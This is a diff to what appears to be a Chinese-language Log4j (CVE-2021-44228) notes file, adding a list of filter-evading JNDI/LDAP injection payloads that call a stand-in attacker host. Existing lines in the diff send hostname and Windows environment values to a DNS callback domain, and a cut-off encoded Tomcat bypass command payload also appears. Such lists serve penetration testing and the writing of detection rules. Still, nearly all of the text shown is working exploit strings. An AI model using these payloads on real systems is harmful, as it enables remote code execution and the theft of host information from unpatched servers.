@@ -185,6 +185,8 @@ c=%24%7Bjndi%3Aldap%3A%2F%2F47.xxx.xxx.xxx%3A9999%2FTomcatBypass%2FCommand%2FBas
 
 [Log4j Bypass WAF Payloads](https://mp.weixin.qq.com/s/H1gH5ZtIAVpLPgmmUfJnaA)
 
+
+
 ```
 ${jndi:ldap://127.0.0.1:1389/ badClassName} 
 
@@ -213,6 +215,36 @@ ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.nsvi5s
 ${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-a}${upper::-p}://${hostName}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}
 
 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk
+```
+
+[CVE-2021-44228-PoC-log4j-bypass-words](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words)
+
+
+```
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}
+
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}
+
+${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}
+
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}
+
+${jnd${upper:ı}:ldap://somesitehackerofhell.com/z}
+
+${jnd${sys:SYS_NAME:-i}:ldap:/somesitehackerofhell.com/z}
+
+${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}
+
+${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://somesitehackerofhell.com/z}
+
+${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://somesitehackerofhell.com/z}
+
+${jndi:ldap://127.0.0.1#somesitehackerofhell.com/z}
+
+{
+    "one-${jnd${a":"a:-i}:ld${",
+    "two":"o:-a}p://somesitehackerofhell.com/z}
+}
 ```
 ## 修复方案
 
